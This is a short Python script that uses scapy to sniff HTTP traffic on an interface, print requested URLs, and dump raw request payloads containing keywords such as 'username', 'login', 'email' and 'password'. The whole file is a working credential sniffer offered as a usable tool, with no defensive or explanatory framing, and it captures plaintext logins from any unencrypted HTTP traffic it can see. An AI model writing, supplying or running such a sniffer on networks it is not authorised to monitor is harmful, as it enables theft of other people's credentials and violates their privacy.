import scapy.all as scapy
from scapy.layers import http

INTERFACE = "eth0"
KEYWORDS = ["user", "username", "login", "email", "password", "pass"]

def sniff(interface: str) -> scapy.Packet:
    scapy.sniff(
        iface=interface,
        store=False,        # don't store data
        prn=process_packet, # func to process sniffed packet
    )


def extract_url(packet: scapy.Packet) -> str:
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url.decode()


def extract_login(packet: scapy.Packet) -> str:
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)

        for kw in KEYWORDS:
            if kw in load:
                return load
            

def process_packet(packet: scapy.Packet) -> None:
    if packet.haslayer(http.HTTPRequest):
        # extract user login
        login = extract_login(packet)
        print(login)
        
        # extract URL
        url = extract_url(packet)
        print(url)

                    

if __name__ == "__main__":
    sniff(interface=INTERFACE)